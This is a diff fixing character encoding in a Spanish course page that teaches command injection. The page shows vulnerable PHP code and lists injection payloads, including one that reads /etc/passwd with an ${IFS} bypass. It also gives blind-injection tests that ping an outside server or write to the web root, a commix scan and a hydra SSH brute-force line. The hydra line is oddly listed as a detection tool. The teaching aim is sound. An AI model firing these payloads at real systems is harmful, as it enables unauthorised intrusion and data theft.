@@ -1,9 +1,9 @@
-﻿<!doctype html>
+<!doctype html>
 <html lang="es">
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>55. Escapando del contexto de un comando | IntroducciÃ³n a Linux</title>
+    <title>55. Escapando del contexto de un comando | Introducción a Linux</title>
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="../../css/styles.css" />
     <style>
@@ -138,60 +138,60 @@
       <ul class="nav-links">
         <li><a href="../../index.html">Cursos</a></li>
         <li><a href="#">Roadmap</a></li>
-        <li><a href="#">ConÃ³cenos</a></li>
+        <li><a href="#">Conócenos</a></li>
       </ul>
       <div class="nav-cta">
-        <button class="btn-ghost">Iniciar sesiÃ³n</button>
+        <button class="btn-ghost">Iniciar sesión</button>
         <button class="btn-accent">Registrarse</button>
       </div>
     </nav>
 
     <div style="background: var(--bg-deep); border-bottom: 1px solid var(--border);">
       <div class="breadcrumb">
-        <a href="../../index.html">Inicio</a><span>â€º</span>
-        <a href="../../index.html">Cursos</a><span>â€º</span>
-        <a href="../../index.html">IntroducciÃ³n a Linux</a><span>â€º</span>
+        <a href="../../index.html">Inicio</a><span>›</span>
+        <a href="../../index.html">Cursos</a><span>›</span>
+        <a href="../../index.html">Introducción a Linux</a><span>›</span>
         <span style="color: var(--text-2);">Clase 55</span>
       </div>
     </div>
 
     <div class="lesson-content">
-      <a href="../../index.html" class="back-link">â† Volver al curso</a>
+      <a href="../../index.html" class="back-link">← Volver al curso</a>
 
-      <span class="course-tag">ðŸ§ Linux Â· Ciberseguridad</span>
+      <span class="course-tag">🐧 Linux · Ciberseguridad</span>
       <h1 class="course-title" style="margin-bottom: 0.5rem;">Escapando del contexto de un comando</h1>
-      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">DuraciÃ³n: 8:15 Â· SecciÃ³n 2: Temario</div>
+      <div style="color: var(--text-3); font-size: 0.85rem; margin-bottom: 2rem;">Duración: 8:15 · Sección 2: Temario</div>
 
-      <p>El command injection (o inyecciÃ³n de comandos) ocurre cuando un atacante logra insertar comandos arbitrarios del sistema a travÃ©s de una aplicaciÃ³n vulnerable. Esto sucede cuando la aplicaciÃ³n pasa datos del usuario directamente al shell sin sanitizarlos.</p>
+      <p>El command injection (o inyección de comandos) ocurre cuando un atacante logra insertar comandos arbitrarios del sistema a través de una aplicación vulnerable. Esto sucede cuando la aplicación pasa datos del usuario directamente al shell sin sanitizarlos.</p>
 
       <h2>Metacaracteres de escape</h2>
-      <p>El shell interpreta ciertos caracteres de forma especial. Si una aplicaciÃ³n los acepta sin filtrar, podemos inyectar comandos:</p>
+      <p>El shell interpreta ciertos caracteres de forma especial. Si una aplicación los acepta sin filtrar, podemos inyectar comandos:</p>
 
       <table>
         <thead>
-          <tr><th>CarÃ¡cter</th><th>FunciÃ³n</th><th>Ejemplo</th></tr>
+          <tr><th>Carácter</th><th>Función</th><th>Ejemplo</th></tr>
         </thead>
         <tbody>
           <tr><td><code>;</code></td><td>Separador de comandos</td><td><code>ls ; id</code></td></tr>
-          <tr><td><code>&&</code></td><td>Ejecuta si el anterior tuvo Ã©xito</td><td><code>cd /tmp && whoami</code></td></tr>
-          <tr><td><code>||</code></td><td>Ejecuta si el anterior fallÃ³</td><td><code>cd /inexistente || ls</code></td></tr>
-          <tr><td><code>$(...)</code></td><td>Subshell con sustituciÃ³n</td><td><code>echo $(whoami)</code></td></tr>
-          <tr><td><code>`...`</code></td><td>SustituciÃ³n de comando (antigua)</td><td><code>echo `whoami`</code></td></tr>
+          <tr><td><code>&&</code></td><td>Ejecuta si el anterior tuvo éxito</td><td><code>cd /tmp && whoami</code></td></tr>
+          <tr><td><code>||</code></td><td>Ejecuta si el anterior falló</td><td><code>cd /inexistente || ls</code></td></tr>
+          <tr><td><code>$(...)</code></td><td>Subshell con sustitución</td><td><code>echo $(whoami)</code></td></tr>
+          <tr><td><code>`...`</code></td><td>Sustitución de comando (antigua)</td><td><code>echo `whoami`</code></td></tr>
           <tr><td><code>|</code></td><td>Pipe (redirige salida a otro comando)</td><td><code>ls | grep txt</code></td></tr>
         </tbody>
       </table>
 
-      <h2>Ejemplo clÃ¡sico en aplicaciones web</h2>
+      <h2>Ejemplo clásico en aplicaciones web</h2>
       <p>Imagina una web que hace ping a una IP ingresada por el usuario:</p>
-      <pre><code>// CÃ³digo vulnerable en PHP
+      <pre><code>// Código vulnerable en PHP
 $ip = $_GET['ip'];
 system("ping -c 4 " . $ip);
 
-// Si el usuario envÃ­a: ip=127.0.0.1; whoami
+// Si el usuario envía: ip=127.0.0.1; whoami
 // Se ejecuta: ping -c 4 127.0.0.1; whoami</code></pre>
 
-      <p>Un payload tÃ­pico de command injection:</p>
-      <pre><code># Payload bÃ¡sico
+      <p>Un payload típico de command injection:</p>
+      <pre><code># Payload básico
 127.0.0.1; whoami
 
 # Reverse shell
@@ -205,35 +205,35 @@ system("ping -c 4 " . $ip);
 127.0.0.1;cat${IFS}/etc/passwd</code></pre>
 
       <h2>Blind command injection</h2>
-      <p>A veces no vemos la salida del comando. Podemos detectarlo con tÃ©cnicas basadas en tiempo o en efectos colaterales:</p>
-      <pre><code># DetecciÃ³n por tiempo (sleep)
+      <p>A veces no vemos la salida del comando. Podemos detectarlo con técnicas basadas en tiempo o en efectos colaterales:</p>
+      <pre><code># Detección por tiempo (sleep)
 127.0.0.1; sleep 5
 
-# DetecciÃ³n por efecto externo (ping hacia nuestro servidor)
+# Detección por efecto externo (ping hacia nuestro servidor)
 127.0.0.1; ping -c 5 192.168.1.5
 
-# DetecciÃ³n por escritura en web accesible
+# Detección por escritura en web accesible
 127.0.0.1; echo injected > /var/www/html/evidence.txt</code></pre>
 
-      <h2>Herramientas de detecciÃ³n</h2>
-      <p>Existen herramientas que automatizan la detecciÃ³n de command injection:</p>
+      <h2>Herramientas de detección</h2>
+      <p>Existen herramientas que automatizan la detección de command injection:</p>
       <pre><code># Commix (recursivo, potente)
 python commix.py --url="http://target.com/page?ip=127.0.0.1"
 
-# Incluir Burp Suite como proxy para anÃ¡lisis manual
-hydra -l usuario -P wordlist.txt ssh://target  # Modo semi-automÃ¡tico</code></pre>
+# Incluir Burp Suite como proxy para análisis manual
+hydra -l usuario -P wordlist.txt ssh://target  # Modo semi-automático</code></pre>
 
       <div class="warning">
-        <strong>âš ï¸</strong> El command injection es una de las vulnerabilidades mÃ¡s crÃ­ticas en OWASP Top 10. Siempre sanitiza las entradas del usuario usando funciones como <code>escapeshellarg()</code> o <code>escapeshellcmd()</code>.
+        <strong>⚠️</strong> El command injection es una de las vulnerabilidades más críticas en OWASP Top 10. Siempre sanitiza las entradas del usuario usando funciones como <code>escapeshellarg()</code> o <code>escapeshellcmd()</code>.
       </div>
 
       <div class="highlight">
-        <strong>ðŸ“–</strong> Para practicar command injection de forma legal, usa plataformas como HackTheBox, TryHackMe, o laboratorios locales con <code>DVWA</code> (Damn Vulnerable Web Application).
+        <strong>📖</strong> Para practicar command injection de forma legal, usa plataformas como HackTheBox, TryHackMe, o laboratorios locales con <code>DVWA</code> (Damn Vulnerable Web Application).
       </div>
 
       <div class="lesson-nav">
-        <a href="clase-54.html">â† Anterior: Fuerza bruta aplicada a conexiones</a>
-        <a href="clase-56.html">Siguiente: Operando con proyectos de Github [1-5] â†’</a>
+        <a href="clase-54.html">← Anterior: Fuerza bruta aplicada a conexiones</a>
+        <a href="clase-56.html">Siguiente: Operando con proyectos de Github [1-5] →</a>
       </div>
     </div>
 
@@ -241,11 +241,11 @@ hydra -l usuario -P wordlist.txt ssh://target  # Modo semi-automÃ¡tico</code><
       <div class="footer-logo">hack4u</div>
       <div class="footer-links">
         <a href="#">Aviso Legal</a>
-        <a href="#">PolÃ­tica de Cookies</a>
+        <a href="#">Política de Cookies</a>
         <a href="#">Privacidad</a>
-        <a href="#">TÃ©rminos y Condiciones</a>
+        <a href="#">Términos y Condiciones</a>
       </div>
-      <div>Â© 2026 hack4u.io â€” Todos los derechos reservados.</div>
+      <div>© 2026 hack4u.io — Todos los derechos reservados.</div>
     </footer>
   </body>
 </html>
